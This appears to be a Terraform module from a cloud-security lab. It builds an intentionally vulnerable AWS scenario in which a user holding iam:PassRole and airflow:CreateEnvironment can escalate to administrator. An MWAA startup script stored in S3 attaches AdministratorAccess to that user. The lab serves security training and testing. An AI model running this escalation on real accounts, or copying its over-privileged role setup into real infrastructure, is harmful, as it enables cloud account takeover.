# PassRole + Airflow CreateEnvironment privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole and airflow:CreateEnvironment
# can escalate privileges by creating an MWAA environment with an admin execution role
# and a malicious startup script. The startup script executes with the execution role's
# credentials and can attach AdministratorAccess to the starting user.
#
# Attack path:
# 1. Attacker has iam:PassRole + airflow:CreateEnvironment permissions
# 2. Creates an MWAA environment with an admin execution role
# 3. Points startup script to an S3 location containing malicious code
# 4. Startup script runs with execution role credentials
# 5. Script attaches AdministratorAccess policy to the attacker's user
# 6. Attacker gains admin access

# Resource naming convention: pl-prod-mwaa-001-to-admin-{resource-type}
# mwaa-001 = Pathfinding.cloud ID for MWAA CreateEnvironment privilege escalation

terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      configuration_aliases = [aws.prod]
    }
  }
}

# =============================================================================
# DATA SOURCES
# =============================================================================

# Get current region
data "aws_region" "current" {
  provider = aws.prod
}

# Get available availability zones
data "aws_availability_zones" "available" {
  provider = aws.prod
  state    = "available"
}

# =============================================================================
# STARTING USER (Initial Access Point)
# =============================================================================

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-mwaa-001-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-mwaa-001-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# Required permissions policy for exploitation
# Note: MWAA uses a Service-Linked Role for actual network operations, but it validates
# that the CALLER has EC2 permissions before proceeding. These are required by MWAA's API.
resource "aws_iam_user_policy" "starting_user_required" {
  provider = aws.prod
  name     = "pl-prod-mwaa-001-to-admin-required-permissions"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "coreAttackPermission1"
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.admin_role.arn
      },
      {
        Sid    = "coreAttackPermission2"
        Effect = "Allow"
        Action = [
          "airflow:CreateEnvironment"
        ]
        Resource = "*"
      },
      {
        # MWAA validates the caller has these permissions even though SLR does the work
        Sid    = "mwaaRequiredEc2Permissions"
        Effect = "Allow"
        Action = [
          "ec2:CreateNetworkInterface",
          "ec2:CreateNetworkInterfacePermission",
          "ec2:CreateVpcEndpoint",
          "ec2:DeleteVpcEndpoints",
          "ec2:DescribeNetworkInterfaces",
          "ec2:DescribeSubnets",
          "ec2:DescribeSecurityGroups",
          "ec2:DescribeVpcs",
          "ec2:DescribeVpcEndpoints",
          "ec2:DescribeVpcEndpointServices"
        ]
        Resource = "*"
      },
      {
        Sid    = "mwaaRequiredS3Permissions"
        Effect = "Allow"
        Action = [
          "s3:GetEncryptionConfiguration"
        ]
        Resource = "*"
      },
      {
        Sid    = "identityPermission"
        Effect = "Allow"
        Action = [
          "sts:GetCallerIdentity"
        ]
        Resource = "*"
      }
    ]
  })
}

# Helpful additional permissions for demonstration
resource "aws_iam_user_policy" "starting_user_helpful" {
  provider = aws.prod
  name     = "pl-prod-mwaa-001-to-admin-helpful-permissions"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "airflowManagement"
        Effect = "Allow"
        Action = [
          "airflow:GetEnvironment",
          "airflow:DeleteEnvironment",
          "airflow:ListEnvironments"
        ]
        Resource = "*"
      },
      {
        Sid    = "verifyPrivilegeEscalation"
        Effect = "Allow"
        Action = [
          "iam:ListAttachedUserPolicies"
        ]
        Resource = aws_iam_user.starting_user.arn
      },
      {
        Sid    = "additionalVpcDiscovery"
        Effect = "Allow"
        Action = [
          "ec2:DescribeRouteTables"
        ]
        Resource = "*"
      },
      {
        Sid    = "readAttackerBucket"
        Effect = "Allow"
        Action = [
          "s3:GetObject",
          "s3:ListBucket"
        ]
        Resource = [
          aws_s3_bucket.attacker_bucket.arn,
          "${aws_s3_bucket.attacker_bucket.arn}/*"
        ]
      }
    ]
  })
}

# =============================================================================
# TARGET ADMIN ROLE (MWAA Execution Role - Privilege Escalation Target)
# =============================================================================

# Admin role that will be passed to MWAA as the execution role
# MWAA requires trust from both airflow.amazonaws.com and airflow-env.amazonaws.com
resource "aws_iam_role" "admin_role" {
  provider = aws.prod
  name     = "pl-prod-mwaa-001-to-admin-admin-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = [
            "airflow.amazonaws.com",
            "airflow-env.amazonaws.com"
          ]
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-mwaa-001-to-admin-admin-role"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess policy to the admin role
resource "aws_iam_role_policy_attachment" "admin_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.admin_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# =============================================================================
# ATTACKER'S S3 BUCKET (DAGs and Startup Script)
# =============================================================================

# S3 bucket for MWAA DAGs and startup script
# This simulates the attacker's bucket containing malicious startup code
resource "aws_s3_bucket" "attacker_bucket" {
  provider      = aws.prod
  bucket        = "pl-mwaa-001-attacker-bucket-${var.account_id}-${var.resource_suffix}"
  force_destroy = true # Allow terraform to delete bucket even with versioned objects

  tags = {
    Name        = "pl-mwaa-001-attacker-bucket"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "attacker-bucket"
  }
}

# Block public access (bucket policy will grant MWAA access)
resource "aws_s3_bucket_public_access_block" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Enable versioning (required by MWAA)
resource "aws_s3_bucket_versioning" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  versioning_configuration {
    status = "Enabled"
  }
}

# Bucket policy allowing MWAA to access the bucket
resource "aws_s3_bucket_policy" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowMWAAAccess"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.admin_role.arn
        }
        Action = [
          "s3:GetObject",
          "s3:GetObjectVersion",
          "s3:ListBucket",
          "s3:ListBucketVersions"
        ]
        Resource = [
          aws_s3_bucket.attacker_bucket.arn,
          "${aws_s3_bucket.attacker_bucket.arn}/*"
        ]
      }
    ]
  })
}

# Malicious startup script that attaches admin policy to starting user
resource "aws_s3_object" "startup_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id
  key      = "startup.sh"
  content  = <<-EOF
#!/bin/bash
# Malicious startup script - executes with MWAA execution role credentials
# This script attaches AdministratorAccess to the starting user

echo "MWAA Startup Script Executing..."
echo "Attempting privilege escalation..."

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name "pl-prod-mwaa-001-to-admin-starting-user" \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
  echo "SUCCESS: Privilege escalation complete!"
  echo "User pl-prod-mwaa-001-to-admin-starting-user now has AdministratorAccess"
else
  echo "FAILED: Could not attach policy"
fi
EOF

  tags = {
    Name        = "pl-mwaa-001-startup-script"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "malicious-startup-script"
  }
}

# Create dags/ folder with a placeholder DAG (MWAA requires at least one DAG)
resource "aws_s3_object" "placeholder_dag" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id
  key      = "dags/placeholder_dag.py"
  content  = <<-EOF
"""
Placeholder DAG for MWAA environment.
This minimal DAG is required because MWAA needs at least one DAG file.
"""
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

with DAG(
    dag_id='placeholder_dag',
    start_date=datetime(2024, 1, 1),
    schedule_interval=None,
    catchup=False,
    description='Placeholder DAG for MWAA environment'
) as dag:

    task = BashOperator(
        task_id='placeholder_task',
        bash_command='echo "Placeholder task executed"'
    )
EOF

  tags = {
    Name        = "pl-mwaa-001-placeholder-dag"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "placeholder-dag"
  }
}

# =============================================================================
# VPC INFRASTRUCTURE (Required for MWAA)
# MWAA requires private subnets in at least 2 AZs with internet access via NAT
# =============================================================================

# Dedicated VPC for this scenario
resource "aws_vpc" "mwaa_vpc" {
  provider             = aws.prod
  cidr_block           = "10.100.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    Name        = "pl-prod-mwaa-001-vpc"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "mwaa-vpc"
  }
}

# Internet Gateway for public subnet
resource "aws_internet_gateway" "mwaa_igw" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  tags = {
    Name        = "pl-prod-mwaa-001-igw"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "internet-gateway"
  }
}

# Public subnet for NAT Gateway (in first AZ)
resource "aws_subnet" "public_subnet" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.100.1.0/24"
  availability_zone       = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = true

  tags = {
    Name        = "pl-prod-mwaa-001-public-subnet"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "public-subnet-for-nat"
  }
}

# Private subnet 1 for MWAA (in first AZ)
resource "aws_subnet" "private_subnet_1" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.100.10.0/24"
  availability_zone       = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = false

  tags = {
    Name        = "pl-prod-mwaa-001-private-subnet-1"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "private-subnet-for-mwaa"
  }
}

# Private subnet 2 for MWAA (in second AZ)
resource "aws_subnet" "private_subnet_2" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.100.11.0/24"
  availability_zone       = data.aws_availability_zones.available.names[1]
  map_public_ip_on_launch = false

  tags = {
    Name        = "pl-prod-mwaa-001-private-subnet-2"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "private-subnet-for-mwaa"
  }
}

# Elastic IP for NAT Gateway
resource "aws_eip" "nat_eip" {
  provider = aws.prod
  domain   = "vpc"

  tags = {
    Name        = "pl-prod-mwaa-001-nat-eip"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "nat-gateway-eip"
  }

  depends_on = [aws_internet_gateway.mwaa_igw]
}

# NAT Gateway in public subnet
resource "aws_nat_gateway" "mwaa_nat" {
  provider      = aws.prod
  allocation_id = aws_eip.nat_eip.id
  subnet_id     = aws_subnet.public_subnet.id

  tags = {
    Name        = "pl-prod-mwaa-001-nat"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "nat-gateway"
  }

  depends_on = [aws_internet_gateway.mwaa_igw]
}

# Route table for public subnet (route to IGW)
resource "aws_route_table" "public_rt" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.mwaa_igw.id
  }

  tags = {
    Name        = "pl-prod-mwaa-001-public-rt"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "public-route-table"
  }
}

# Route table for private subnets (route to NAT)
resource "aws_route_table" "private_rt" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  route {
    cidr_block     = "0.0.0.0/0"
    nat_gateway_id = aws_nat_gateway.mwaa_nat.id
  }

  tags = {
    Name        = "pl-prod-mwaa-001-private-rt"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "private-route-table"
  }
}

# Associate public subnet with public route table
resource "aws_route_table_association" "public_subnet_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.public_subnet.id
  route_table_id = aws_route_table.public_rt.id
}

# Associate private subnet 1 with private route table
resource "aws_route_table_association" "private_subnet_1_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.private_subnet_1.id
  route_table_id = aws_route_table.private_rt.id
}

# Associate private subnet 2 with private route table
resource "aws_route_table_association" "private_subnet_2_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.private_subnet_2.id
  route_table_id = aws_route_table.private_rt.id
}

# Security group for MWAA
# MWAA requires a security group that allows self-referencing inbound traffic
resource "aws_security_group" "mwaa_sg" {
  provider    = aws.prod
  name        = "pl-prod-mwaa-001-sg"
  description = "Security group for MWAA environment - allows self-referencing traffic"
  vpc_id      = aws_vpc.mwaa_vpc.id

  # Self-referencing inbound rule (MWAA workers communicate with each other)
  ingress {
    from_port = 0
    to_port   = 0
    protocol  = "-1"
    self      = true
    description = "Allow all traffic from within the security group (MWAA requirement)"
  }

  # Allow all outbound traffic (for internet access via NAT)
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "Allow all outbound traffic"
  }

  tags = {
    Name        = "pl-prod-mwaa-001-sg"
    Environment = var.environment
    Scenario    = "iam-passrole+airflow-createenvironment"
    Purpose     = "mwaa-security-group"
  }
}
